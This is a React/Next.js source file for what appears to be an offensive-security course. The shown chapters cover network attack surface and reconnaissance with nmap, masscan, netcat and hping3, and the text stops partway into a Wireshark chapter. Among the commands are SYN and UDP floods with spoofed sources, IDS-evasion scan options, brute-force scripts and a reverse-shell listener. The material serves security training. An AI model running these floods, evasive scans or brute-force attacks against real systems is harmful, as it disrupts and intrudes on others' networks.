'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#00ffff'

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a9a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem', fontFamily: 'sans-serif' }}>{children}</p>
)

const H = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 700, color: accent, marginTop: '2rem', marginBottom: '0.5rem', letterSpacing: '0.08em' }}>{children}</h3>
)

const Note = ({ label, children }: { label?: string; children: React.ReactNode }) => (
  <div style={{ background: 'rgba(0,255,255,0.05)', border: '1px solid rgba(0,255,255,0.2)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#00ffff', letterSpacing: '0.15em', marginBottom: '6px' }}>{label || 'NOTE'}</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
  </div>
)

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a7a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#020a0a', border: '1px solid #003a3a', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'ch1-fundamentals',
    title: 'Network Fundamentals for Attackers',
    difficulty: 'BEGINNER',
    readTime: '18 min',
    content: (
      <div>
        <P>Before launching any network attack you need to understand the infrastructure you are attacking. Every tool, every technique, and every defense maps to a specific layer of the network stack. This chapter builds that mental model from the ground up.</P>

        <H>OSI Model - Attacker Perspective</H>
        <P>The OSI (Open Systems Interconnection) model has 7 layers. Each layer has its own protocols, vulnerabilities, and attack tools. Knowing which layer you are operating at tells you which defenses apply and which tools to reach for.</P>
        <Pre label="// OSI LAYERS AND ASSOCIATED ATTACKS">{`Layer 7 - Application
  Protocols: HTTP, HTTPS, DNS, FTP, SMTP, LDAP, SMB
  Attacks: SQLi, XSS, credential brute force, DNS poisoning,
           HTTP flood, Slowloris, SMTP open relay
  Tools: Burp Suite, sqlmap, Hydra, dnschef

Layer 6 - Presentation
  Protocols: TLS/SSL, JPEG, MPEG, ASCII encoding
  Attacks: SSL stripping, POODLE, BEAST, cert forgery
  Tools: sslstrip, mitmproxy, testssl.sh

Layer 5 - Session
  Protocols: SMB, NetBIOS, RPC, SQL sessions
  Attacks: Session hijacking, NTLM relay, pass-the-hash
  Tools: Responder, ntlmrelayx, CrackMapExec

Layer 4 - Transport
  Protocols: TCP, UDP
  Attacks: SYN flood, TCP hijacking, port scanning,
           UDP amplification, connection exhaustion
  Tools: hping3, nmap, scapy, netcat

Layer 3 - Network
  Protocols: IP, ICMP, OSPF, BGP
  Attacks: IP spoofing, ICMP redirect, route injection,
           TTL manipulation, BGP hijacking
  Tools: hping3, scapy, nemesis, quagga

Layer 2 - Data Link
  Protocols: ARP, Ethernet, 802.1Q (VLAN), STP, CDP
  Attacks: ARP spoofing, MAC flooding, VLAN hopping,
           STP root election, CDP info disclosure
  Tools: arpspoof, bettercap, yersinia, macchanger, dsniff

Layer 1 - Physical
  Attacks: Cable tapping, hardware keylogger, rogue AP,
           optical fiber interception
  Tools: WiFi Pineapple, hardware implants`}</Pre>

        <H>TCP/IP Model and Header Attack Surface</H>
        <P>In practice attackers think in the TCP/IP model (4 layers). Every header field is a potential attack vector - either to spoof, manipulate, or exploit.</P>
        <Pre label="// CRITICAL HEADER FIELDS FOR ATTACKERS">{`IP HEADER (20 bytes minimum):
  Version (4 bits)    - IPv4 vs IPv6 confusion attacks
  TTL (8 bits)        - fingerprint OS, traceroute, hop counting
  Protocol (8 bits)   - TCP=6, UDP=17, ICMP=1
  Src IP (32 bits)    - SPOOF THIS for amplification, decoy scans
  Dst IP (32 bits)    - routing, broadcast amplification
  Flags (3 bits)      - DF bit: don't fragment (MTU probing)
  Fragment Offset     - fragmentation evasion attacks

TCP HEADER (20 bytes minimum):
  Src Port (16 bits)  - spoof for bypass, randomize for stealth
  Dst Port (16 bits)  - service identification
  Seq Number (32 bits)- session hijacking if predictable
  Ack Number (32 bits)- connection state tracking
  Flags (9 bits):
    SYN - initiate connection (SYN flood target)
    ACK - acknowledgement (firewall inference with -sA)
    FIN - close connection gracefully
    RST - reset connection (TCP RST injection)
    URG - urgent data (rarely used, evasion)
    PSH - push data immediately
  Window Size (16 bits)- OS fingerprinting, flow control
  Checksum (16 bits)  - --badsum in nmap tests IDS behavior

UDP HEADER (8 bytes only):
  Src Port, Dst Port, Length, Checksum
  No state = harder to filter = amplification attacks

ICMP:
  Type 8 (Echo Request) - ping sweep discovery
  Type 0 (Echo Reply)   - response confirms host up
  Type 11 (TTL Exceeded)- traceroute mechanism
  Type 3 (Unreachable)  - port closed indicator
  Type 5 (Redirect)     - ICMP redirect attack vector`}</Pre>

        <H>TCP 3-Way Handshake and Attack Opportunities</H>
        <Note label="BEGINNER NOTE">The TCP handshake is how two computers agree to start a conversation. Think of it like knocking on a door (SYN), getting an answer (SYN-ACK), and confirming you heard them (ACK). Attackers can abuse each step.</Note>
        <Pre label="// HANDSHAKE PHASES AND ATTACK VECTORS">{`Phase 1 - SYN (Client to Server):
  Client sends: SYN, seq=X
  Server allocates memory, stores half-open connection
  ATTACK: SYN flood - send millions of SYNs from spoofed IPs
           Server fills backlog queue, legitimate connections rejected

Phase 2 - SYN-ACK (Server to Client):
  Server sends: SYN+ACK, seq=Y, ack=X+1
  ATTACK: SYN-ACK reflection - spoof src IP to victim
           Server floods victim with SYN-ACKs (amplification ~1.4x)

Phase 3 - ACK (Client to Server):
  Client sends: ACK, ack=Y+1
  Connection ESTABLISHED - both sides enter ESTABLISHED state
  ATTACK: If seq numbers predictable, inject ACK with correct seq
           = TCP session hijacking (historical, modern OS randomizes)

Half-Open Scan (nmap -sS):
  Client sends SYN
  If port OPEN:   server sends SYN-ACK -> client sends RST (never ACKs)
  If port CLOSED: server sends RST immediately
  Advantage: never completes handshake, harder to log

SYN Cookie Defense (linux default):
  Server encodes connection state in SYN-ACK sequence number
  No memory allocated until final ACK received
  Defeats SYN flood - check: sysctl net.ipv4.tcp_syncookies`}</Pre>

        <H>IPv4 Addressing - CIDR, RFC1918, Broadcast</H>
        <Pre label="// ADDRESSING KNOWLEDGE EVERY ATTACKER NEEDS">{`PRIVATE RANGES (RFC 1918) - not routable on internet:
  10.0.0.0/8        (10.0.0.0 - 10.255.255.255)   Class A
  172.16.0.0/12     (172.16.0.0 - 172.31.255.255) Class B
  192.168.0.0/16    (192.168.0.0 - 192.168.255.255) Class C

SPECIAL ADDRESSES:
  127.0.0.0/8       Loopback (localhost = 127.0.0.1)
  169.254.0.0/16    APIPA / link-local (no DHCP assigned)
  0.0.0.0/0         Default route (all traffic)
  255.255.255.255   Limited broadcast (layer 2 only)
  x.x.x.255        Directed broadcast for subnet (Smurf attack)

CIDR NOTATION:
  /24 = 256 hosts (mask 255.255.255.0)   - typical LAN
  /16 = 65536 hosts                       - corporate network
  /8  = 16M hosts                         - class A
  /32 = single host                       - specific target
  /30 = 4 addresses, 2 usable            - point-to-point links

CIDR QUICK MATH:
  192.168.1.100/24
    Network: 192.168.1.0
    Broadcast: 192.168.1.255
    Hosts: .1 through .254

SUBNET ENUMERATION:
  ipcalc 192.168.1.100/24   # show network details
  nmap -sn 192.168.1.0/24   # ping scan entire subnet`}</Pre>

        <H>IPv6 Fundamentals and Attack Surface</H>
        <P>IPv6 is increasingly common and introduces new attack surface. Many networks run dual-stack (IPv4 + IPv6) and IPv6 is often less monitored than IPv4.</P>
        <Pre label="// IPv6 ADDRESSING AND NEIGHBOR DISCOVERY ATTACKS">{`ADDRESS TYPES:
  ::1/128           Loopback
  fe80::/10         Link-local (auto-assigned, every interface)
  fc00::/7          Unique local (RFC4193, like RFC1918)
  2000::/3          Global unicast (routable internet)
  ff02::1           All-nodes multicast (replaces broadcast)
  ff02::2           All-routers multicast
  ff02::1:ff00::/104 Solicited-node multicast (for NDP)

NEIGHBOR DISCOVERY PROTOCOL (NDP) replaces ARP:
  ICMPv6 Type 133 - Router Solicitation  (host asks for router)
  ICMPv6 Type 134 - Router Advertisement (router announces self)
  ICMPv6 Type 135 - Neighbor Solicitation (who has this IPv6?)
  ICMPv6 Type 136 - Neighbor Advertisement (I have this IPv6)

  ARP SPOOFING EQUIVALENT: Neighbor Advertisement spoofing
  Send fake NA claiming your MAC for target IPv6 addr

SLAAC (Stateless Address Autoconfiguration):
  Host receives RA (Router Advertisement)
  Generates address from prefix + interface MAC (EUI-64)
  ATTACK: Send rogue RAs via flood6 or fake_router6
  Tools: thc-ipv6 toolkit, mitm6

IPv6 ATTACKS:
  mitm6   - Spoof DHCPv6 + DNS to capture NTLMv2 hashes
  flood6  - RA flood to disrupt routing
  alive6  - IPv6 host discovery
  parasite6 - NDP spoofing (ARP poison equivalent)
  redir6  - ICMPv6 redirect attack

DUAL-STACK GOTCHA:
  Many firewalls filter IPv4 but allow IPv6 freely
  Always check for IPv6 on targets: nmap -6 fe80::1%eth0`}</Pre>

        <H>DNS Resolution Process and Attack Surface</H>
        <Pre label="// DNS RESOLUTION CHAIN - WHERE ATTACKS LIVE">{`RESOLUTION CHAIN:
  1. Browser cache
  2. OS resolver cache (/etc/hosts first)
  3. Recursive resolver (your ISP or 8.8.8.8)
  4. Root nameservers (13 root servers, anycast)
  5. TLD nameservers (.com, .net, .org)
  6. Authoritative nameserver (final answer)

ATTACK SURFACES:
  Step 2: /etc/hosts poisoning (local access required)
  Step 3: DNS cache poisoning (Kaminsky attack)
           Flood resolver with fake responses
           If txid matches before real response -> cached
  Step 5-6: Zone transfer (AXFR) from misconfigured NS
  Any step: DNS interception (MITM + bettercap dns.spoof)
  Any step: DNS tunneling (data exfil via DNS queries)

RECORD TYPES (know these for recon):
  A     - IPv4 address
  AAAA  - IPv6 address
  CNAME - Canonical name (alias)
  MX    - Mail exchanger (priority + hostname)
  NS    - Nameserver for domain
  TXT   - Text records (SPF, DKIM, DMARC, juicy info)
  PTR   - Reverse lookup (IP -> hostname)
  SOA   - Start of Authority (zone serial, TTL defaults)
  SRV   - Service location records (_ldap._tcp, _kerberos._tcp)

DNS SECURITY MECHANISMS (and why they often fail):
  DNSSEC - signs records with crypto, rarely deployed
  DoH    - DNS over HTTPS (hides queries, bypasses filters)
  DoT    - DNS over TLS port 853
  RPKI   - BGP route origin validation`}</Pre>

        <H>Common Ports and Services Reference</H>
        <Pre label="// PORT MAP - EVERY PENTESTER MUST MEMORIZE">{`WELL-KNOWN PORTS (0-1023):
  20/21  FTP (data/control) - often anonymous, cleartext creds
  22     SSH  - brute force, key attacks, tunneling
  23     Telnet - fully cleartext, legacy systems
  25     SMTP - open relay, user enum, mail injection
  53     DNS  - zone transfer, amplification, tunneling
  67/68  DHCP - rogue server, starvation
  69     TFTP - unauthenticated file transfer
  80     HTTP - web attacks, enumeration
  88     Kerberos - AS-REQ brute force, ticket attacks
  110    POP3 - cleartext email retrieval
  111    RPC portmapper - NFS enumeration
  119    NNTP
  123    NTP  - monlist amplification attack (556x)
  135    MSRPC - Windows RPC endpoint mapper
  137-139 NetBIOS - LLMNR/NBT-NS poisoning with Responder
  143    IMAP
  161/162 SNMP - community string brute, MIB dump, write access
  389    LDAP - anonymous bind, injection, AD enumeration
  443    HTTPS
  445    SMB  - EternalBlue, SMB relay, share enumeration
  465    SMTPS
  514    Syslog
  515    LPD (printer)
  546/547 DHCPv6
  587    SMTP submission
  636    LDAPS
  993    IMAPS
  995    POP3S

REGISTERED PORTS (1024-49151):
  1080   SOCKS proxy
  1433   MSSQL - credential attacks, xp_cmdshell RCE
  1521   Oracle DB
  2049   NFS  - exposed share mounting, root squash bypass
  3268   LDAP Global Catalog
  3306   MySQL - credential attacks, UDF injection
  3389   RDP  - BlueKeep, credential spray, NLA bypass
  4444   Metasploit default handler
  5432   PostgreSQL
  5900   VNC  - weak passwords, unencrypted
  5985/5986 WinRM - lateral movement, PowerShell remoting
  6379   Redis - unauthenticated RCE via config rewrite
  6443   Kubernetes API
  8080   HTTP alternate / proxy
  8443   HTTPS alternate
  8888   Jupyter Notebook - often unauthenticated
  9200   Elasticsearch - unauthenticated HTTP API
  11211  Memcached - UDP amplification (51000x), info disclosure
  27017  MongoDB - unauthenticated access, data exfil`}</Pre>

        <H>Network Topology - Trust Zones and Segmentation</H>
        <Pre label="// HOW SEGMENTATION AFFECTS YOUR ATTACK PATH">{`TYPICAL ENTERPRISE NETWORK ZONES:
  Internet (untrusted)
       |
  [Perimeter Firewall]
       |
  DMZ (semi-trusted) - web servers, mail, DNS, VPN gateway
       |
  [Internal Firewall]
       |
  Internal LAN (trusted)
    |-- Corporate VLAN (workstations)
    |-- Server VLAN (file, print, app servers)
    |-- Management VLAN (network gear, OOB)
    |-- Guest VLAN (isolated internet only)
    |-- Production VLAN (databases, critical systems)

ATTACK PATH IMPLICATIONS:
  External attacker:
    1. Compromise DMZ host (webshell, vuln service)
    2. Pivot to internal LAN (tunnel through DMZ host)
    3. Enumerate internal network
    4. Lateral movement to server VLAN
    5. Escalate to domain admin
    6. Access production VLAN / databases

VLAN SEGMENTATION BYPASS:
  VLAN hopping (Chapter 4) breaks L2 segmentation
  Misconfigured trunk ports expose all VLANs
  Dual-homed servers bridge VLANs

FLAT NETWORK (no segmentation):
  Attacker on any workstation can reach:
  - Domain controllers
  - Database servers
  - Backup servers
  = Disaster (but very common in SMBs)`}</Pre>

        <H>Firewalls, IDS/IPS - Types and Evasion Fundamentals</H>
        <Pre label="// UNDERSTANDING DEFENSES TO BYPASS THEM">{`FIREWALL TYPES:
  Packet filter (L3/L4):
    - Stateless, checks src/dst IP + port + protocol
    - Simple ACLs, cheap, fast
    - Bypass: use allowed ports (80/443/53), fragment packets

  Stateful inspection (L4):
    - Tracks TCP connection state
    - Blocks packets not part of established session
    - Bypass: inject into established sessions

  Application layer (L7 / proxy):
    - Understands HTTP, DNS, FTP content
    - Detects protocol anomalies
    - Bypass: encode payloads, use valid-looking HTTP

  NGFW (Next-Gen Firewall):
    - App ID, user ID, threat intelligence feeds
    - SSL inspection (MITM your HTTPS)
    - Bypass: CDN fronting, encrypted C2, valid TLS certs

IDS vs IPS:
  IDS (Intrusion Detection System):
    - Passive monitor, generates alerts only
    - Does NOT block traffic
    - Signature-based: known attack patterns
    - Behavioral: anomaly from baseline

  IPS (Intrusion Prevention System):
    - Inline, actively blocks malicious traffic
    - False positive risk = legitimate traffic dropped
    - Evasion = IDS/IPS evasion

EVASION FUNDAMENTALS (details in Chapter 6):
  Fragmentation: reassembly required before inspection
  Slow timing: evade rate-based detection
  Encoding: base64, hex, ROT13 in payloads
  Protocol confusion: tunneling HTTP inside DNS
  Decoy traffic: blend attack with legitimate patterns`}</Pre>

        <H>Proxies, Load Balancers, NAT</H>
        <Pre label="// HOW NETWORK INFRASTRUCTURE CHANGES ATTACK SURFACE">{`NAT (Network Address Translation):
  Hides internal IPs behind single public IP
  Impact on attacker:
  - Scanning from internet sees only public IP
  - Cannot directly reach internal hosts
  - Bypass: SSRF from internal service, VPN misconfiguration

REVERSE PROXY / LOAD BALANCER:
  Cloudflare, nginx, HAProxy in front of web servers
  Impact:
  - Real server IP hidden behind proxy IP
  - WAF (Web Application Firewall) often present
  - Find real IP via: SSL cert history, DNS history,
    Shodan searches, email headers from app, subdomains
  - Tools: censys, shodan, viewdns.info, securitytrails

FORWARD PROXY:
  Transparent: intercepts all outbound traffic (MITM-able)
  Explicit: clients configured to use proxy
  Impact on attacker:
  - All outbound connections go through proxy
  - Non-HTTP protocols may be blocked
  - But CONNECT method allows TCP tunneling over HTTP!
  - HTTPTunnel, chisel, and others exploit this

CONTENT DELIVERY NETWORK (CDN):
  Traffic flows through CDN edge nodes globally
  Provides DDoS mitigation (absorbs volume attacks)
  SSL termination at CDN edge
  For attackers: CDN fronting (hide C2 behind CDN)`}</Pre>
      </div>
    ),
    takeaways: [
      'The OSI layer an attack targets determines which tools detect it and which defenses apply - always identify the layer first',
      'Every TCP/IP header field is attack surface: spoof src IP for amplification, manipulate TTL for OS fingerprinting, abuse flags for firewall bypass',
      'SYN flood works by exhausting the server connection backlog before handshakes complete - SYN cookies mitigate this without memory allocation',
      'IPv6 is frequently less monitored than IPv4 on dual-stack networks - NDP (Neighbor Discovery) is the ARP equivalent and equally unauthenticated',
      'DNS has no authentication by default - every step in the resolution chain is a potential interception or poisoning point'
    ]
  },

  {
    id: 'ch2-scanning',
    title: 'Reconnaissance and Scanning',
    difficulty: 'BEGINNER',
    readTime: '20 min',
    content: (
      <div>
        <P>Reconnaissance is the first phase of any engagement. You need to know what is running, what version it is, and whether it has known vulnerabilities before you touch anything. Passive recon leaves no trace. Active scanning risks detection. Know which you are doing.</P>

        <Note label="LEGAL NOTE">Scanning systems without authorization is illegal in most jurisdictions. Always have written permission before scanning. Use labs like HackTheBox, TryHackMe, or your own isolated network for practice.</Note>

        <H>Passive Network Recon</H>
        <Pre label="// GATHER INTEL WITHOUT TOUCHING THE TARGET">{`SHODAN (search engine for internet-connected devices):
  https://shodan.io
  Search syntax:
    hostname:target.com         - hosts for domain
    org:"Target Corp"           - all IPs for org
    net:203.0.113.0/24          - CIDR range
    port:22 "SSH-2.0-OpenSSH_7.4" - specific SSH version
    http.title:"Login"          - login pages
    ssl.cert.subject.cn:*.target.com - SSL cert subdomains
    product:"Apache httpd" version:"2.4.49" - vuln version
    has_vuln:CVE-2021-44228     - Log4Shell-vulnerable hosts

CENSYS (certificate + port data):
  https://censys.io
  Strength: comprehensive TLS cert data, historical records
  certificates.parsed.names:target.com
  ip:203.0.113.100

BGP ROUTE ANALYSIS:
  bgp.he.net           - Hurricane Electric BGP toolkit
  ASN lookup: whois -h whois.radb.net AS15169
  Find all IP ranges owned by org
  Useful for scope discovery in bug bounties

WHOIS:
  whois target.com     - registrar, dates, name servers
  whois 203.0.113.100  - ARIN/RIPE allocation data

CERTIFICATE TRANSPARENCY LOGS:
  crt.sh/?q=%.target.com  - find all subdomains via SSL certs
  certspotter.com
  Returns: subdomains, internal hostnames, staging servers

DNS RECONNAISSANCE (passive):
  # Historical DNS records:
  securitytrails.com, viewdns.info, dnshistory.org
  # DNSX for bulk resolution:
  echo "target.com" | dnsx -a -aaaa -cname -mx -txt`}</Pre>

        <H>nmap - Complete Flag Reference</H>
        <Pre label="// HOST DISCOVERY">{`# Ping scan only (no port scan):
nmap -sn 192.168.1.0/24

# TCP SYN ping (useful when ICMP blocked):
nmap -PS22,80,443 192.168.1.0/24

# TCP ACK ping:
nmap -PA80,443 192.168.1.0/24

# UDP ping:
nmap -PU53,161 192.168.1.0/24

# ICMP echo ping:
nmap -PE 192.168.1.0/24

# Disable ARP ping (stealth on local net):
nmap --disable-arp-ping -PE 192.168.1.0/24

# No ping (assume all hosts up):
nmap -Pn 192.168.1.0/24

# No DNS resolution (faster):
nmap -n 192.168.1.0/24`}</Pre>
        <Pre label="// SCAN TYPES">{`-sS   TCP SYN (stealth) - default, requires root
      Sends SYN, gets SYN-ACK=open or RST=closed
      Never completes handshake

-sT   TCP connect - full handshake, no root needed
      Slower, more detectable, logged by target

-sU   UDP scan - slow, unreliable, but finds SNMP/DNS/TFTP
      nmap -sU --top-ports 100 TARGET_IP

-sA   TCP ACK - firewall inference, NOT port discovery
      RST=unfiltered, no response=filtered

-sF   FIN scan - sends FIN, closed ports send RST
      Open ports (RFC 793) do not respond
      Bypasses some stateless firewalls

-sX   Xmas scan - FIN+PSH+URG flags set
      Same logic as FIN scan, different fingerprint

-sN   Null scan - no flags set
      Same logic, different fingerprint

-sW   Window scan - ACK with window size analysis
      Differentiates open from closed via window

-sM   Maimon scan - FIN+ACK
      BSD systems close open ports (reverse behavior)

-sI ZOMBIE_IP   Idle scan - completely blind scan
      Uses IP ID sequence of idle zombie host
      Your IP never appears in target logs`}</Pre>
        <Pre label="// PORT SPECIFICATION">{`-p 80           Single port
-p 80,443,8080  Multiple ports
-p 1-1024       Range
-p-             All 65535 ports
-p U:53,T:80    UDP 53 + TCP 80
--top-ports 100 Most common 100 ports
--top-ports 1000 Most common 1000 (default equivalent)
-F              Fast - top 100 ports only`}</Pre>
        <Pre label="// VERSION AND OS DETECTION">{`-sV              Version detection
--version-intensity 0   Light (faster, less accurate)
--version-intensity 5   Default
--version-intensity 9   All probes (slowest, most accurate)
--version-light         Alias for intensity 2
--version-all           Alias for intensity 9

-O               OS detection (requires root)
--osscan-guess   Aggressive OS guess when not certain
--osscan-limit   Only try OS detect on likely candidates

-A               Aggressive: -sV -O -sC --traceroute combined`}</Pre>
        <Pre label="// TIMING TEMPLATES">{`-T0   Paranoid   - 5 min between probes, IDS evasion
-T1   Sneaky     - 15 sec between probes
-T2   Polite     - 0.4 sec delay
-T3   Normal     - default
-T4   Aggressive - faster (--max-rtt-timeout 1250ms)
-T5   Insane     - fastest, prone to inaccuracy

FINE-GRAINED TIMING:
--min-rate 100          At least 100 packets/sec
--max-rate 500          No more than 500 packets/sec
--scan-delay 500ms      Delay between each probe
--min-parallelism 10    Minimum parallel probes
--max-parallelism 100   Maximum parallel probes
--host-timeout 30m      Abandon host after 30 minutes`}</Pre>
        <Pre label="// NSE SCRIPTING ENGINE">{`-sC             Run default scripts (equivalent to --script=default)
--script=SCRIPT Run specific script or category

CATEGORIES:
  auth       Authentication bypass / default creds
  brute      Brute force attacks
  default    Safe, fast, informative scripts
  discovery  Service and host discovery
  exploit    Active exploitation (use carefully!)
  external   Queries external services (WHOIS, etc)
  fuzzer     Fuzz inputs
  intrusive  High network impact, may crash services
  malware    Detect malware/backdoors
  safe       Non-intrusive, safe on any target
  version    Service version detection helpers
  vuln       Check for known vulnerabilities

USEFUL SPECIFIC SCRIPTS:
nmap --script=smb-vuln-ms17-010 TARGET_IP        # EternalBlue
nmap --script=smb-vuln-cve-2020-0796 TARGET_IP   # SMBGhost
nmap --script=http-shellshock TARGET_IP           # Shellshock
nmap --script=ftp-anon TARGET_IP                  # Anonymous FTP
nmap --script=dns-zone-transfer --script-args dns-zone-transfer.domain=target.com NS_IP
nmap --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt TARGET_IP
nmap --script=snmp-brute TARGET_IP
nmap --script=rdp-vuln-ms12-020 TARGET_IP
nmap --script=http-title,http-headers 192.168.1.0/24
nmap --script=vulners -sV TARGET_IP               # CVE lookup`}</Pre>
        <Pre label="// OUTPUT FORMATS">{`-oN output.txt      Normal (human readable)
-oX output.xml      XML (importable to Metasploit, etc)
-oG output.gnmap    Grepable format
-oA output          All three formats simultaneously
-v                  Verbose (show open ports as found)
-vv                 Very verbose
-d                  Debug output
--reason            Show why port state determined
--open              Show only open ports
--packet-trace      Show all packets sent/received`}</Pre>
        <Pre label="// EVASION TECHNIQUES">{`-D RND:10           Decoy scan - 10 random decoy IPs
-D 1.2.3.4,5.6.7.8 Specific decoys (use real IPs for realism)
-S SPOOF_IP         Spoof source address (need --send-ip)
--source-port 53    Pretend to come from DNS port
--source-port 80    Pretend to come from HTTP port
-f                  Fragment packets (8-byte fragments)
-f -f               16-byte fragments (--mtu 16 equivalent)
--mtu 24            Custom MTU for fragmentation
--data-length 50    Append random data to packets
--randomize-hosts   Scan targets in random order
--badsum            Invalid checksum (test IDS behavior)
--spoof-mac 0       Random MAC for ethernet frames
-T0                 Paranoid timing (5 min between probes)`}</Pre>

        <H>masscan - Internet-Scale Scanning</H>
        <Pre label="// HIGH-SPEED SCANNING WITH MASSCAN">{`# Install:
sudo apt install masscan

# Basic scan (rate controlled - DO NOT exceed network capacity):
sudo masscan 192.168.1.0/24 -p80,443,22 --rate=1000

# Scan all ports (fast):
sudo masscan TARGET_IP -p0-65535 --rate=10000

# Banner grabbing:
sudo masscan TARGET_IP -p80,443 --banners --rate=1000

# Save results:
sudo masscan 192.168.1.0/24 -p22,80,443 --rate=500 -oX results.xml

# Exclude file (prevent scanning certain IPs):
sudo masscan 10.0.0.0/8 -p80 --excludefile exclude.txt

# Output to paused.conf (resume later):
sudo masscan 10.0.0.0/8 -p0-65535 --rate=100000 --output-format paused
sudo masscan --resume paused.conf`}</Pre>

        <H>rustscan - Fast Port Discovery + nmap Integration</H>
        <Pre label="// RUSTSCAN: FIND PORTS FAST, HAND OFF TO NMAP">{`# Install:
cargo install rustscan
# Or Docker: docker run -it --rm --name rustscan rustscan/rustscan

# Basic scan (finds open ports in seconds):
rustscan -a TARGET_IP

# Pass open ports to nmap automatically:
rustscan -a TARGET_IP -- -sV -sC

# Specific port range:
rustscan -a TARGET_IP -r 1-10000

# Scan subnet:
rustscan -a 192.168.1.0/24

# Adjust batch size (higher = faster but may miss ports):
rustscan -a TARGET_IP -b 500 --timeout 2000`}</Pre>

        <H>Netcat - The Swiss Army Knife</H>
        <Pre label="// NETCAT FOR SCANNING, GRABBING, AND SHELLS">{`# Port scan (basic):
nc -zv TARGET_IP 20-1024

# UDP scan:
nc -zuv TARGET_IP 53 161 69

# Banner grabbing (connect and observe):
nc TARGET_IP 80
  (type) HEAD / HTTP/1.0
  (press Enter twice)

# Banner grab with timeout:
echo "" | nc -w 3 TARGET_IP 22

# Connect to service:
nc TARGET_IP 25           # SMTP
nc TARGET_IP 110          # POP3

# Simple file transfer (receiver first):
nc -lvp 4444 > received_file
nc TARGET_IP 4444 < file_to_send

# Chat / simple tunnel:
nc -lvp 4444

# Reverse shell listener:
nc -lvnp 4444

# ncat (improved nc with SSL support):
ncat --ssl TARGET_IP 443       # SSL connect
ncat --ssl -lvp 8443           # SSL listener`}</Pre>

        <H>hping3 - Custom Packet Crafting</H>
        <Pre label="// HPING3 FOR SCANNING AND CUSTOM PACKETS">{`# TCP SYN scan:
hping3 -S -p 80 TARGET_IP

# TCP ACK scan (firewall probing):
hping3 -A -p 80 TARGET_IP

# SYN flood (testing only, authorized targets):
hping3 --flood --syn -p 80 TARGET_IP

# Stealth: random source IP:
hping3 --flood --rand-source -S -p 80 TARGET_IP

# Traceroute:
hping3 --traceroute -V -1 TARGET_IP

# ICMP ping:
hping3 -1 TARGET_IP

# UDP flood:
hping3 --flood --udp -p 53 TARGET_IP

# Custom TTL (for traceroute tricks):
hping3 -S -p 80 --ttl 10 TARGET_IP

# Fragment packets:
hping3 -S -p 80 -f TARGET_IP`}</Pre>

        <H>Service Enumeration and Banner Grabbing</H>
        <Pre label="// IDENTIFY SERVICES AND VERSIONS">{`# Nikto (web server scanner):
nikto -h TARGET_IP
nikto -h TARGET_IP -p 8080
nikto -h TARGET_IP -ssl
nikto -h TARGET_IP -o results.html -Format htm

# Whatweb (web technology fingerprint):
whatweb TARGET_IP
whatweb -a 3 TARGET_IP     # aggressive

# HTTP banner via curl:
curl -I http://TARGET_IP                    # HEAD request
curl -v http://TARGET_IP 2>&1 | head -20    # verbose headers

# FTP banner:
nc TARGET_IP 21

# SSH version:
ssh -v TARGET_IP 2>&1 | grep "remote software"
# Or: nc TARGET_IP 22

# SMTP banner and enumeration:
nc TARGET_IP 25
EHLO test.com
VRFY admin
EXPN admin

# SMB enumeration:
enum4linux -a TARGET_IP
smbclient -L //TARGET_IP -N
crackmapexec smb TARGET_IP

# SNMP enumeration:
snmpwalk -v2c -c public TARGET_IP
onesixtyone -c community.txt TARGET_IP`}</Pre>
      </div>
    ),
    takeaways: [
      'Passive recon (Shodan, Censys, crt.sh) reveals attack surface with zero packets sent to target - always start here',
      'nmap -sS (SYN scan) is the default because it never completes the handshake, making it less likely to appear in application logs',
      'The idle scan (-sI) is the only scan that completely hides your IP - the zombie host IP appears in target logs instead',
      'NSE scripts transform nmap from a port scanner into a vulnerability assessment tool - the vuln category checks common CVEs automatically',
      'rustscan finds open ports in seconds then hands them to nmap for deep analysis - combine both for speed and depth'
    ]
  },

  {
    id: 'ch3-wireshark',
    title: 'Wireshark and Packet Analysis',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    content: (
      <div>
        <P>Packet analysis is how you see exactly what is happening on the wire. Whether you are hunting credentials in cleartext protocols, reconstructing files from a pcap, detecting attack patterns, or analyzing C2 traffic - Wireshark and its command-line counterpart TShark are essential tools.</P>

        <H>Capture Filters vs Display Filters</H>
        <Note label="KEY DISTINCTION">Capture filters (BPF syntax) are applied at capture time and discard non-matching packets permanently. Display filters (Wireshark syntax) are applied after capture and just hide packets - they can be changed. Use capture filters to reduce file size; display filters for analysis.</Note>
        <Pre label="// CAPTURE FILTERS (BPF - set before capturing)">{`# In Wireshark: type in "...using this filter" box before starting capture
# In tcpdump: pass as final argument

host 192.168.1.100          # traffic to or from IP
src host 192.168.1.100      # traffic FROM this IP only
dst host 192.168.1.100      # traffic TO this IP only
net 192.168.1.0/24          # entire subnet
port 80                     # TCP or UDP port 80
tcp port 443                # TCP port 443 only
not port 22                 # exclude SSH (reduce noise)
port 80 or port 443         # HTTP and HTTPS
host 192.168.1.1 and port 80
not broadcast and not multicast   # unicast only
icmp                        # ICMP only
arp                         # ARP only
tcp[tcpflags] & tcp-syn != 0      # SYN packets only
tcp[tcpflags] == tcp-syn          # ONLY SYN (no ACK)`}</Pre>
        <Pre label="// DISPLAY FILTERS (Wireshark syntax - applied after capture)">{`# Basic protocol filters:
http            tcp.port == 80
tls             tcp.port == 443
dns             udp.port == 53 or tcp.port == 53
